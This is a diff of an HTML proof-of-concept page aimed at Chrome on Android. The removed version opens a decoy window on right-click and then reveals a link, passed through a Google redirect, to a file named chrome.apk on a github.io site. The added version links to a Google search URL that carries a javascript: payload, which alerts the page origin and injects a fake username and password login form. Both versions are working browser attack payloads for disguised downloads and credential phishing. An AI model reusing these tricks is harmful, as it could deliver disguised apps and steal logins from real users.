@@ -3,67 +3,28 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Chrome Android Intent and Download PoC</title>
-
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Chrome Android URL Test</title>
   <style>
     .button {
-      background-color: #4CAF50;
-      border: none;
-      color: white;
-      padding: 15px 32px;
-      text-align: center;
-      text-decoration: none;
       display: inline-block;
-      font-size: 16px;
-      margin: 4px 2px;
-      cursor: pointer;
+      padding: 15px 32px;
+      background: #4CAF50;
+      color: white;
+      text-decoration: none;
       border-radius: 4px;
-    }
-
-    #downloadArea {
-      display: none;
-      margin-top: 20px;
+      font-size: 16px;
     }
   </style>
 </head>
 <body>
-
-<center>
-  <a href="https://google.com"
-     id="intentLink"
-     class="button">
-    Download From Original Site
-  </a>
-
-  <div id="downloadArea">
-    <p>APK destination is ready.</p>
-    <a
-      class="button"
-      href="https://www.google.com/url?q=https%3A%2F%2Fecdnts-del.github.io%2Ftest-apk%2Fchrome.apk&sa=D&sntz=1&usg=AOvVaw079XKrSIcTiPDZFMOucTH3"
-      target="_blank"
-      rel="noopener">
-      Continue to APK
+  <center>
+    <a class="button"
+       href="https://www.google.com/search?q=javascript%3Aalert%28location.origin%29%3Bwindow.open%3D%27%3Cform%20style=%22display:flex;%20gap:8px;%20align-items:center;%22%3E%20%3Cinput%20type=%22text%22%20placeholder=%22Username%22%3E%20%3Cinput%20type=%22password%22%20placeholder=%22Password%22%3E%20%3Cbutton%20type=%22submit%22%3ELogin%3C/button%3E%20%3C/form%3E%27%3B&PC=U316&FORM=CHROMN"
+       target="_blank"
+       rel="noopener">
+      Open URL Test
     </a>
-  </div>
-</center>
-
-<script>
-const link = document.getElementById("intentLink");
-let triggered = false;
-
-link.addEventListener("contextmenu", () => {
-  if (triggered) return;
-  triggered = true;
-
-  const newWindow = window.open("https://google.com", "x");
-
-  setTimeout(() => {
-    document.getElementById("downloadArea").style.display = "block";
-    triggered = false;
-  }, 5000);
-});
-</script>
-
+  </center>
 </body>
 </html>
